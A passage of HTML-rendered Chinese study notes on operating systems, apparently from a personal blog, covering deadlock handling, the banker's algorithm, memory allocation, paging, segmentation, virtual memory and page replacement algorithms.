punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        producerconsumer<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token function">consumer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        item <span class="token operator">=</span> producerconsumer<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        消费产品 item<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token number">1234567891011121314151617181920212223242526272829303132333435</span></pre></td></tr></table></figure><p>拓展 2：Java 中类似于管程的机制</p><p>java 中用 synchronized 来描述一个函数，这个函数同一时间只能被一个线程调用</p><h3 id="24_1-死锁的概念"><a class="markdownIt-Anchor" href="#24_1-死锁的概念">#</a> 2.4_1 死锁的概念</h3><p>1、什么是死锁</p><p>各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。</p><p>2、进程死锁、饥饿、死循环的区别</p><p>死锁：</p><p>定义：各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。</p><p>区别：至少两个或两个的进程同时发生死锁</p><p>饥饿：</p><p>定义：由于长期得不到想要的资源，某进程无法向前推进的现象。</p><p>区别：可能只有一个进程发生饥饿</p><p>死循环：</p><p>定义：某进程执行过程中一直跳不出某个循环的现象。</p><p>区别：死循环是程序员的问题</p><p>3、死锁产生的必要条件</p><ul><li>互斥条件：多个进程争夺资源发生死锁</li><li>不剥夺条件：进程获得的资源不能由其它进程强行抢夺</li><li>请求和保持条件：某个进程有了资源，还在请求资源</li><li>循环等待条件：存在资源的循环等待链</li></ul><p>4、什么时候会发生死锁</p><ul><li>对系统资源的竞争</li><li>进程推进顺序非法</li><li>信号量的使用不当也会造成死锁</li></ul><p>5、死锁的处理策略</p><ul><li>预防死锁</li><li>避免死锁</li><li>死锁的检测和解除</li></ul><h3 id="24_2-死锁的处理策略预防死锁"><a class="markdownIt-Anchor" href="#24_2-死锁的处理策略预防死锁">#</a> 2.4_2 死锁的处理策略 —— 预防死锁</h3><p>1、不允许死锁发生</p><ul><li>静态策略：预防死锁<ul><li>破坏互斥条件（有些不能破坏）<br>把互斥的资源改造为共享资源</li><li>破坏不剥夺条件（复杂，造成之前工作失效，降低系统开销，会全部放弃、导致饥饿）<br>方案 1：当请求得不到满足的时候，立即释放手里的资源<br>方案 2：由系统介入，强行帮助剥夺</li><li>破坏请求和保持条件（资源利用率极低，可能会导致某些进程饥饿）<br>采用静态分配方法，一次性全部申请，如果申请不到，不要允许</li><li>破坏循环等待条件（不方便增加新的设备，实际使用与递增顺序不一致，会导致资源的浪费，必须按规定次序申请资源）<br>顺序资源分配法：对资源编号，进程按编号递增顺序请求资源</li></ul></li><li>动态检测：避免死锁</li></ul><p>2、允许死锁发生</p><ul><li>死锁的检测和解除</li></ul><h3 id="24_3-死锁的处理策略避免死锁"><a class="markdownIt-Anchor" href="#24_3-死锁的处理策略避免死锁">#</a> 2.4_3 死锁的处理策略 —— 避免死锁</h3><p>动态检测：避免死锁</p><ul><li><p>什么是安全序列</p><p>进行后面的某些情况，不会使系统发生死锁</p></li><li><p>什么是系统的不安全状态，与死锁有何联系<br>如果系统处于安全状态，就一定不会发生死锁。如果系统进入不安全状态，就可能发生死锁（处于不安全状态未必就是发生了死锁，但发生死锁时一定时在不安全状态）</p></li><li><p>如何避免系统进入不安全状态 —— 银行家算法</p><p>初始分配完成后，优先全部分配给最少的，并且拿回资源</p></li></ul><p>步骤：</p><p>1、检查此次申请是否超过了之前声明的最大需求数</p><p>2、检查此时系统剩余的可用资源是否还能满足这次请求</p><p>3、试探着分配，更改各数据结构</p><p>4、用安全性算法检查此次所分配是否会导致系统进入不安全状态</p><h3 id="24_4-死锁的处理策略检测和解除"><a class="markdownIt-Anchor" href="#24_4-死锁的处理策略检测和解除">#</a> 2.4_4 死锁的处理策略 —— 检测和解除</h3><p>死锁的检测</p><p>1、用某种数据结构来保存资源的请求和分配信息</p><p>2、提供一种算法，利用上述信息来检测系统是否已进入死锁状态</p><p>死锁的解除</p><p>1、资源剥夺法：挂起某些死锁进程，并抢占它的资源，将这些资源分配给其他的死锁进程。</p><p>2、撤销进程法：强制撤销部分，甚至全部死锁进程，并剥夺这些进程的资源。</p><p>3、进程回退法：让一个或多个死锁进程回退到足以避免死锁的地步。</p><h3 id="31_1-内存的基础知识"><a class="markdownIt-Anchor" href="#31_1-内存的基础知识">#</a> 3.1_1 内存的基础知识</h3><p>主存储器：简称主存或内存，主要用于保存进程运行时的程序和数据</p><p>寄存器：是 CPU 内部的一些小型存储区域，用于暂时存放参与运算的指令、数据和运算结果等内容</p><p>高速缓存：是介于寄存器和内存之间的存储器，主要用于备份内存中较常用的数据，以减少处理机对内存的访问次数。</p><p>磁盘缓存：主要用于暂时存放频繁使用的一部分磁盘数据，以减少访问磁盘的次数。</p><p>CPU 生成的地址通常称为逻辑地址或相对地址，而内存单元 (即装入内存地址寄存器的地址) 看到的地址通常称为物理地址或绝对地址</p><p>相对地址：相对于进程的起始地址而言的地址 1</p><p>从写程序到程序运行：编辑 - 编译 - 链接 - 装入</p><p>三种链接方式：静态链接（在程序运行前，先将各目标模块及它们所需的库函数连接成一个完整的可执行文件）、装入时动态链接（将各目标模块装入内存时，边装入边链接的链接方式）、运行时动态链接（在程序执行中需要该模块时，才对它进行链接，其优点是便于修改和更新。）</p><p>三种装入方式：绝对装入（在编译的时候就知道程序放在内存的哪个位置）、可重定位装入方式（装入时将逻辑地址转表为物理地址）、动态运行时装入方式（把地址转化推迟到程序真正要执行时才进行）</p><p>绝对装入：在编译时，如果知道程序将放到内存中的哪个位置，编译程序将产生绝对地址的目标代<br>装入程序按照装入模块中的地址，将程序和数据装入内存。</p><p>可重定位装入方式：编译、链接后的装入模块的地址都是从 0 开始的，指令中使用的地<br>址、数据存放的地址都是相对于起始地址而言的逻辑地址。可根据内存的当前情况，将装入模块装入<br>到内存的适当位置。装入时对地址进行 “重定位”，将逻辑地址变换为物理地址（地址变换是在装入时一次完成的)</p><p>可重定位装入方式的特点是在一个作业装入内存时，必须分配其要求的全部内存空间，如果没有足够的内存，就不能装入该作业。作业一旦进入内存后，在运行期间就不能再移动，也不能再申请内存空间。</p><p>动态重定位：又称动态运行时装入。编译、链接后的装入模块的地址都是从 0 开始的。装入程序把装入模块装入内存后，并不会立即把逻辑地址转换为物理地址，而是把地址转换推迟到程序真正要执行<br>时才进行。因此装入内存后所有的地址依然是逻辑地址。这种方式需要一个重定位寄存器的支持。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728154546336.png" alt="image-20230728154546336"></p><h2 id="内存保护"><a class="markdownIt-Anchor" href="#内存保护">#</a> 内存保护</h2><p>系统通过两个寄存器实现这种保护：基地址寄存器和界限寄存器</p><p>基地址寄存器保存最小的合法物理内存地址</p><p>界限寄存器制定了合法的范围大小 (界限地址)</p><p>内存空间保护的实现是通过 CPU 硬件对在用户态下产生的物理地址与寄存器地址进行比较来完成的，即判断 &quot;基地址 &lt;= 物理地址 &lt;(基地址 + 界限地址)&quot;</p><h3 id="31_3-覆盖与交换"><a class="markdownIt-Anchor" href="#31_3-覆盖与交换">#</a> 3.1_3 覆盖与交换</h3><p>内存空间的扩充</p><p>覆盖技术：将程序分为多个段，内存分为” 固定区 “和” 覆盖区 “，需要常驻的放在” 固定区 “，调入后就不再调出，不常用的段放在” 覆盖区 “，需要用到时调入内存，用不到时掉出内存</p><p>必须由程序员声明覆盖结构，操作系统完成自动覆盖。缺点：对用户不透明，增加了用户编程负担。<br>覆盖技术只用于早期的操作系统中，现在已成为历史。</p><p>交换技术：内存空间紧张时，系统将内存中某些进程暂时换出外存，把外存中某些已具备运行条件的进程换入内存（PCB 会常驻内存，不会被换出）</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728163541263.png" alt="image-20230728163541263"></p><p>换出进程：只能换出非共享的程序和数据段，而对那些共享的程序和数据段，只要还有进程需要他，就不能被换出。</p><h3 id="31_4-连续分配管理方式"><a class="markdownIt-Anchor" href="#31_4-连续分配管理方式">#</a> 3.1_4 连续分配管理方式</h3><p>连续分配方式指为用户进程分配的必须是一个连续的内存空间</p><p><strong>单一连续分配</strong>：内存被分配为系统区和用户区，系统区在低地址用于存放操作系统相关数据，用户区用于存放用户进程相关数据，内存中只能有一道用户程序，用户程序独占整个用户区空间。<br>优点：实现简单；无外部碎片：可以采用覆盖技术扩充内存；不一定需要采取内存保护 (eg: 早期的 PC 操作<br>系统 MS-DOS)</p><p>缺点：只能用于单用户、单任务的操作系统中；有内部碎片；存储器利用率极低。</p><p><strong>固定分区分配</strong>：将用户区分割为若干固定分区给各道程序，分割策略有分区大小相等和分区大小不相等，可以建议一个分区说明表来管理各个分区</p><p>分区大小相等：缺乏灵活性，但是很适合用于用一台计算机控制多个相同对象的场合</p><p>分区大小不等：增加了灵活性，可以满足不同大小的进程需求。根据常在系统中运行的作业大小情况进行划分 (比如：划分多个小分区、适量中等分区、少量大分区)</p><p><strong>固定分区分配</strong></p><p>优点：实现简单，无外部碎片</p><p>缺点：. 当用户程序太大时，可能所有的分区都不能满足需求，此时不得不采用覆盖技术来解决，但这又会降低性能；b. 会产生内部碎片，内存利用率低。</p><p><strong>动态分区分配</strong>：可变分区分配，不会预先划分内存分区，而是在进程装入内存时，根据进程的大小动态地建立分区，并使分区的大小正好适合进程的需要。</p><p>内部碎片：已经被分配出去（能明确指出属于哪个进程）却不能被利用的内存空间；</p><p>外部碎片：还没有被分配出去（指内存中的某些空闲分区），但由于太小无法利用</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728171956635.png" alt="image-20230728171956635"></p><h3 id="31_5-动态分区分配算法"><a class="markdownIt-Anchor" href="#31_5-动态分区分配算法">#</a> 3.1_5 动态分区分配算法</h3><p>1、首次适应算法（First Fit)</p><p>算法思想：每次从低地址开始查找，找到第一个能满足大小的空闲分区</p><p>如何实现：空闲分区以<strong>地址</strong>递增的次序排列。每次分配内存时顺序查找空闲分区链或空闲分区表，找到大小能满足要求的第一个分区</p><p>2、最佳适应算法 (Best Fit)</p><p>算法思想：由于动态分区分配是一种连续分配方式，为各进程分配的空间必须是连续的一整片区<br>域。因此为了保证当 “大进程” 到来时能有连续的大片空间，可以尽可能多地留下大片的空闲区，<br>即，优先使用更小的空闲区。</p><p>如何实现：空闲分区按<strong>容量</strong>递增次序链接。每次分配内存时顺序查找空闲分区链（或空闲分区<br>表)，找到大小能满足要求的第一个空闲分区。</p><p>缺点：每次都选最小的分区进行分配，会留下越来越多的、很小的、难以利用的内存块。因此这种方法会产生很多的外部碎片。</p><p>3、最坏适应算法 (Worst Fit)</p><p>算法思想：为了解决最佳适应算法的问题一一即留下太多难以利用的小碎片，可以在每次分配时<br>优先使用最大的连续空闲区，这样分配后剩余的空闲区就不会太小，更方便使用。<br>如何实现：空闲分区按容量递减次序链接。每次分配内存时顺序查找空闲分区链（或空闲分区<br>表)，找到大小能满足要求的第一个定闲分区</p><p>缺点：每次都选最大的分区进行分配，虽然可以让分配后留下的空闲区更大，更可用，但是这种方式会导致较大的连续空闲区被迅速用完。如果之后有 “大进程” 到达，就没有内存分区可用了。</p><p>4、领近适应算法 (Next Fit)（循环首次适应算法）</p><p>算法思想：首次适应算法每次都从链头开始查找的。这可能会导致低地址部分出现很多小的空闲<br>分区，而每次分配查找时，都要经过这些分区，因此也增加了查找的开销。如果每次都从上次查<br>找结束的位置开始检索，就能解决上述问题。<br>如何实现：空闲分区以地址递增的顺序排列（可排成一个循环链表）。每次分配内存时从上次查<br>找结束的位置开始查找空闲分区链或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728175630016.png" alt="image-20230728175630016"></p><p>四种算法中 首次适应算法比较好</p><h3 id="31_6-基本分页存储管理的基本概念"><a class="markdownIt-Anchor" href="#31_6-基本分页存储管理的基本概念">#</a> 3.1_6 基本分页存储管理的基本概念</h3><p>1B=8bit</p><p>1KB=2<sup>10</sup>B</p><p>1MB=2<sup>20</sup>B</p><p>1GB=2<sup>30</sup>B</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728191253317.png" alt="image-20230728191253317"></p><p>允许一个进程分散地装入到许多不相邻的位置</p><p>连续分配：为用户进程分配连续的内存空间</p><p>非连续分配：为用户进程分配分散的内存空间</p><p>将内存分为大小相等的小分区 “页框”，将用户的进程空间也分为大小相等的一个个区域，以页框的基本单位分配给每个进程片</p><p>分页管理：物理地址 = 页面的起始位置 + 偏移量</p><p>计算机中用 2 的整数倍表示页面的大小</p><p>页表：存放页号和块号的对应关系</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728194719850.png" alt="image-20230728194719850"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728195243807.png" alt="image-20230728195243807"></p><p>逻辑地址变为物理地址</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803141545724.png" alt="image-20230803141545724"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803141812641.png" alt="image-20230803141812641"></p><h3 id="31_7-基本地址变换机构"><a class="markdownIt-Anchor" href="#31_7-基本地址变换机构">#</a> 3.1_7 基本地址变换机构</h3><p>页表寄存器（PTR），存放页表在内存中的起始地址 F 和页表长度 M，进程未执行时，页表的起始地址和页表的长度放在进程控制块（PCB）中，当进程被调度时，操作系统内核会把它们放在页表寄存器中。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728223649189.png" alt="image-20230728223649189"></p><h3 id="31_8-具有快表的地址变换机构"><a class="markdownIt-Anchor" href="#31_8-具有快表的地址变换机构">#</a> 3.1_8 具有快表的地址变换机构</h3><p>1、局部性原理</p><p>时间局部性：访问某个数据后，在不久的将来还会被访问</p><p>空间局部性：程序访问了某个存储单元，不久之后，其附近的存储单元也很有可能被访问</p><p>2、什么是快表（TLB）</p><p>快表：又称联想寄存器（TLB），是一种访问速度比内存快很多的高速缓冲 ，用来存放当前访问的若干页表项，以加速地址变换的过程。与此对应，内存中的页表常称为慢表。</p><p>3、引入快表后，地址的变换过程</p><p>①CPU 给出逻辑地址，由某个硬件算得页号、页内偏移量，将页号与快表中的所有页号进行比较。<br>②如果找到匹配的页号，说明要访问的页表项在快表中有副本，则直接从中取出该页对应的内存块<br>号，再将内存块号与页内偏移量拼接形成物理地址，最后，访问该物理地址对应的内存单元。因此，<br>若快表命中，则访问某个逻辑地址仅需一次访存即可。<br>③如果没有找到匹配的页号，则需要访问内存中的页表，找到对应页表项，得到页面存放的内存块<br>号，再将内存块号与页内偏移量拼接形成物理地址，最后，访问该物理地址对应的内存单元。因此，<br>若快表未命中，则访问某个逻辑地址需要两次访存（注意：在找到页表项后，应同时将其存入快表，<br>以便后面可能的再次访问。但若快表已满，则必须按照一定的算法对旧的页表项进行替换)</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728224622441.png" alt="image-20230728224622441"></p><h3 id="31_9-两级页表"><a class="markdownIt-Anchor" href="#31_9-两级页表">#</a> 3.1_9 两级页表</h3><p>1、单级页表存在什么问题？如何解决？</p><p>所有页表项必须连续存放，页表过大时需要很大的连续空间</p><p>在一段时间内并非所有页面都用得到，因此没必要让整个页表常驻内存</p><p>2、两级页表的原理、逻辑地址结构</p><p>将长长的页表再分页</p><p>逻辑地址结构：（一级页号、二级页号、页内偏移量）</p><p>页目录表、外层页表、顶级页表</p><p>3、如何实现地址变换？</p><p>按照地址结构将逻辑地址拆分成三部分</p><p>从 PCB 中读出页目录表始址，根据一级页号查页目录表，找到下一级页表在内存中的存放位置</p><p>根据二级页号查表，找到最终想访问的内存块号</p><p>结合页内偏移量得到物理地址</p><p>4、两级页表问题需要注意的几个细节</p><p>多级页表中，各级页表的大小不能超过一个页面。若两级页表不够，可以分更多级</p><p>多级页表的访问次数（假设没有快表结构）——N 级页表访问一个逻辑地址需要 N+1 次访存</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729153926400.png" alt="image-20230729153926400"></p><h3 id="31_10-基本分段存储管理方式"><a class="markdownIt-Anchor" href="#31_10-基本分段存储管理方式">#</a> 3.1_10 基本分段存储管理方式</h3><p>1、什么是分段？</p><p>进程的地址空间：按照程序自身的逻辑关系划分为若干个段，每段有段名，每段从 0 开始编址</p><p><strong>段号的位数决定了每个进程最多可以分几个段</strong></p><p><strong>段内地址位数决定了每个段的最大长度是多少</strong></p><p>内存分配规则：以段为单位进行分配，每个段在内存中占据连续空间，但各段之间可以不相邻。</p><p>若段表存放的起始地址为 M, 则 K 号段对应的段表项存放的地址为 M+K*6B</p><p>2、什么是段表</p><p>段表：段映射表</p><p>每个程序被分段后，用段表记录该程序在内存中存放的位置</p><p>段表：段号 段长 基址</p><p>3、如何实现地址变换</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729164000796.png" alt="image-20230729164000796"></p><p>4、分段、分页管理的对比</p><p>页是信息的物理单位。分页的主要目的是为了实现离散分配，提高内存利用率。分页仅仅是系统管<br>理上的需要，完全是系统行为，对用户是不可见的。<br>段是信息的逻辑单位。分段的主要目的是更好地满足用户需求。一个段通常包含着一组属于一个逻<br>辑模块的信息。分段对用户是可见的，用户编程时需要显式地给出段名。</p><p>页的大小固定且由系统决定。段的长度却不固定，决定于用户编写的程序。<br>分页的用户进程地址空间是一维的，程序员只需给出一个记忆符即可表示一个地址。<br>分段的用户进程地址空间是二维的，程序员在标识一个地址时，既要给出段名，也要给出段内地址。</p><p>分段比分页更容易实现信息的共享和保护（不能被修改的代码称为纯代码和可重入代码，不属于临界资源）</p><p><strong>访问一个逻辑地址需要几次访存</strong></p><p>分页（单级页表）：第一次访存一一查内存中的页表，第二次访存一一访问目标内存单元。总共两次<br>访存<br>分段：第一次访存一一查内存中的段表，第二次访存一一访问目标内存单元。总共两次访存</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729171748011.png" alt="image-20230729171748011"></p><h3 id="31_11-段页式的管理方式"><a class="markdownIt-Anchor" href="#31_11-段页式的管理方式">#</a> 3.1_11 段页式的管理方式</h3><h4 id="1-分页-分段管理方式最大的优缺点"><a class="markdownIt-Anchor" href="#1-分页-分段管理方式最大的优缺点">#</a> 1、分页、分段管理方式最大的优缺点</h4><p>分页：优点：利用率高，碎片少，不会产生外部碎片只有少量内部碎片</p><p>缺点：不方便进行信息共享和保护</p><p>分段：优点：方便信息共享和保护，</p><p>缺点：如果段长过大，为其分配很大的连续空间会很不方便，段式管理容易产生外部碎片</p><p><strong>段号的位数决定了每个进程最多可以分几个段</strong><br><strong>页号位数决定了每个段最大有多少页</strong><br><strong>页内偏移量决定了页面大小、内存块大小是多少</strong></p><p><strong>一个进程会对应一个段表  一个进程有可能对应多个页表</strong></p><h4 id="2-分段分页的结合段页式管理方式"><a class="markdownIt-Anchor" href="#2-分段分页的结合段页式管理方式">#</a> 2、分段 + 分页的结合 —— 段页式管理方式</h4><p>先分段再分页</p><p>段号 + 页号 + 页内偏移量</p><p>地址结构是二维的</p><p>4、如何实现地址变换</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729181321218.png" alt="image-20230729181321218"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230729181447895.png" alt="image-20230729181447895"></p><h2 id="页号合法但该页未装人内存故产生缺页中断"><a class="markdownIt-Anchor" href="#页号合法但该页未装人内存故产生缺页中断">#</a> 页号合法，但该页未装人内存，故产生缺页中断。</h2><h2 id="页号非法及内存中不存在该页号故产生越界中断"><a class="markdownIt-Anchor" href="#页号非法及内存中不存在该页号故产生越界中断">#</a> 页号非法，及内存中不存在该页号，故产生越界中断。</h2><h3 id="32_1-虚拟内存的基本概念"><a class="markdownIt-Anchor" href="#32_1-虚拟内存的基本概念">#</a> 3.2_1 虚拟内存的基本概念</h3><p>1、传统存储管理方式的特征、缺点</p><p>传统存储管理包括：连续分配 和非连续分配</p><p>连续分配：单一连续分配，固定分区分配，动态分区分配</p><p>非连续分配：基本分页存储管理，基本分段存储管理，基本段页式存储管理</p><p>常规存储器管理方式的两大特征：一次性，驻留性</p><p><strong>缺点：</strong></p><p>一次性：作业必须一次性全部装入内存后才能开始运行。这会造成两个问题：①作业很大时，不能全<br>部装入内存，导致大作业无法运行：②当大量作业要求运行时，由于内存无法容纳所有作业，因此只<br>有少量作业能运行，导致多道程序并发度下降。</p><p>驻留性：一旦作业被装入内存，就会一直驻留在内存中，直至作业运行结束。</p><p>2、局部性原理</p><ul><li>时间局部性：现在访问的指令、数据在不久后很可能会被再次访问</li><li>空间局部性：现在访问的内存单元周围的内存空间，很可能在不就后会被访问</li><li>高速缓存技术：使用频繁的数据放到更高速的存储器中</li></ul><p><strong>前面写过</strong></p><p>3、虚拟内存的定义和特征</p><p><strong>三个主要特征</strong></p><p>多次性：无需在作业运行时一次性全部装入内存，而是允许被分成多次调用内存</p><p>对换性：在作业运行时无需一直常驻内存，而是允许在作业运行过程中，将作业换入换出</p><p>虚拟性：从逻辑上扩充了内存的容量，使用户看到的内存容量，远大于实际的容量</p><p>虚拟内存最大容量是计算机地址结构确定的</p><p>虚拟内存的实际容量 = min (内存和外存容量之和，CPU 寻址范围)</p><p>eg：某计算机地址结构为 32 位，按字节编址，内存大小为 512MB，外存大小为 2GB.</p><p>则虚拟内存的最大容量为 2^32B=4GB</p><p>虚拟内存的实际容量 = min (2^32B,512MB+2GB)=2GB+512MB</p><p>4、如何实现虚拟内存技术</p><p>在程序执行过程中，当所访问的信息不再内存时，由操作系统负责将所需信息从外存调入内存，然后继续执行程序。若内存空间不够，由操作系统负责将内存中暂时用不到的信息换出到外存。</p><h1 id="内存管理总概念"><a class="markdownIt-Anchor" href="#内存管理总概念">#</a> 内存管理总概念</h1><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803202441641.png" alt="image-20230803202441641"></p><h3 id="32_2-请求分页管理方式"><a class="markdownIt-Anchor" href="#32_2-请求分页管理方式">#</a> 3.2_2 请求分页管理方式</h3><p>1、页表机制</p><p>请求分页存储的页表：</p><p>内存块号 状态位 访问字段 修改位 外存地址</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803211913696.png" alt="image-20230803211913696"></p><p>2、缺页中断机制</p><p><strong>为什么会产生缺页中断</strong></p><p>缺页中断是因为当前执行的指令想要访问的目标页面未调入内存而产生的，因此属于内中断<br>条指令在执行期间，可能产生多次缺页中断。（如：copy A to B, 即将逻辑地址 A 中的数据复制到<br>逻辑地址 B, 而 A、B 属于不同的页面，则有可能产生两次中断)</p><p>在请求分页系统中，每当要访问的页面不在内存时，便产生一个缺页中断，然后由操作系统的缺页中断处理程序处理中断。此时缺页的进程阻塞，放入阻塞队列，调页完成后再将其唤醒，放回就绪队列。如果内存中有空闲块，则为进程分配一个空闲块，将所缺页面装入该块，并修改页表中相应的页表项。</p><p>内中断，可被修复</p><p>3、地址变换机构</p><p>在具有快表机构的请求分页系统中，访问一个逻辑地址时，若发生缺页，则地址变换步骤是查快表（未命中）一一查慢表（发现未调入内存）一一调页（调入的页面对应的表项会直接加入快表) 一一查快表（命<br>中) 一一访间目标内存单元</p><p>补充细节：<br>①只有 “写指令” 才需要修改 “修改位”。并且，一般来说只需修改快表中的数据，只有要将快表项删除时才需要写回内存中的慢表。这样可以减少访存次数<br>②和普通的中断处理一样，缺页中断处理依然需要保留 CPU 现场。<br>③需要用某种 “页面置换算法” 来决定一个换出页面（下节内容<br>④换入 / 换出页面都需要启动慢速的 / O 操作，可见，如果换入 / 换出太频繁，会有很大的开销。<br>⑤页面调入内存后，需要修改慢表，同时也需要将表项复制到快 表中</p><p>找到页表项是需要检查页面是否在内存中<br>若页面不再内存中，需要请求调页<br>若内存空间不够，还需换出页面<br>页面调入内存后，需要修改相应页表项</p><h3 id="32_3-页面置换算法"><a class="markdownIt-Anchor" href="#32_3-页面置换算法">#</a> 3.2_3 页面置换算法</h3><h4 id="1-最佳置换算法opt"><a class="markdownIt-Anchor" href="#1-最佳置换算法opt">#</a> 1、最佳置换算法（OPT）</h4><p>每次选择淘汰的页面是以后永不使用或者在最长时间内不再被访问的页面，这样可以保证最低的缺页率。</p><p>选择从内存中淘汰一页。按最佳置换的规则，往后寻找，最后一个出现的页号就是要淘汰的页面<br><strong>注意：缺页时未必发生页面置换。若还有可用的空闲内存块，就不用进行页面置换。</strong></p><p>缺页率 = 缺页中断的次数 / 访问页面的总次数</p><p>最佳置换算法是一种理想中的算法 在现实中不可能实现</p><h4 id="2-先进先出置换算法fifo"><a class="markdownIt-Anchor" href="#2-先进先出置换算法fifo">#</a> 2、先进先出置换算法（FIFO）</h4><p>每次选择淘汰的页面是最早进入内存的页面</p><p>实现方法：把调入内存的页面根据调入的先后顺序排成一个队列，需要换出页面时选择队头页面即可。<br>队列的最大长度取决于系统为进程分配了多少个内存块。</p><p>Belady 异常，当分配的内存块增大时，缺页次数反而增加</p><p>只有先进先出算法会产 Belady 异常</p><p>算法性能差</p><h4 id="3-最近最久未使用置换算法lru"><a class="markdownIt-Anchor" href="#3-最近最久未使用置换算法lru">#</a> 3、最近最久未使用置换算法（LRU）</h4><p>每次淘汰最近最久未使用的页面</p><p>实现方法：赋予每个页面对应的页表项中，用访问字段记录该页面自上次被访问以来所经历的时间 t。<br>当需要淘汰一个页面时，选择现有页面中 t 值最大的，也就是最近访问时间最短的，即最近最久未使用的页面。</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803220649438.png" alt="image-20230803220649438"></p><p><strong>最佳置换算法性能最好，但无法实现；先进先出置换算法实现简单，但算法性能差；最近最久未使用</strong><br><strong>置换算法性能好，是最接近 OPT 算法性能的，但是实现起来需要专门的硬件支持，算法开销大。</strong><br><strong>时钟置换算法是一种性能和开销较均衡的算法，又称 CLOCK 算法，或最近未用算法 (NRU,Not</strong><br><strong>Recently Used</strong></p><h4 id="4-时钟置换算法最近未用算法clock"><a class="markdownIt-Anchor" href="#4-时钟置换算法最近未用算法clock">#</a> 4、时钟置换算法（最近未用算法，CLOCK）</h4><p>简单的 CLOCK 算法实现方法：为每个页面设置一个访问位，再将内存中的页面都通过链接指针链接成<br>一个循环队列。当某页被访问时，其访问位置为 1。当需要淘汰一个页面时，只需检查页的访问位。<br>如果是 0，就选择该页换出；如果是 1，则将它置为 0，暂不换出，继续检查下一个页面，若第一轮扫<br>描中所有页面都是 1，则将这些页面的访问位依次置为 0 后，再进行第二轮扫描（第二轮扫描中一定会<br>有访问位为 0 的页面，因此简单的 CLOCK 算法选择一个淘汰页面最多会经过两轮扫描)</p><p><strong>简单的：淘汰一个页面最多经历两轮扫描，初始为 1，扫一下为 0，再扫一下被踢</strong></p><h4 id="5-改进型的时钟置换算法"><a class="markdownIt-Anchor" href="#5-改进型的时钟置换算法">#</a> 5、改进型的时钟置换算法</h4><p>因此，除了考虑一个页面最近有没有被访问过之外，操作系统还应考虑页面有没有被修改过。在其他<br>条件都相同时，应优先淘汰没有修改过的页面，避免 / O 操作。这就是改进型的时钟置换算法的思想。<br>修改位 = 0，表示页面没有被修改过；修改位 = 1，表示页面被修改过。</p><p>优先淘汰没有被修改过的，因为没有修改过的不用进行 IO 操作 00-&gt;01（改）-&gt;00-&gt;01</p><p>淘汰一个页面 最多经历四轮扫描</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230803223354930.png" alt="image-20230803223354930"></p><h3 id="32_4-页面分配策略"><a class="markdownIt-Anchor" href="#32_4-页面分配策略">#</a> 3.2_4 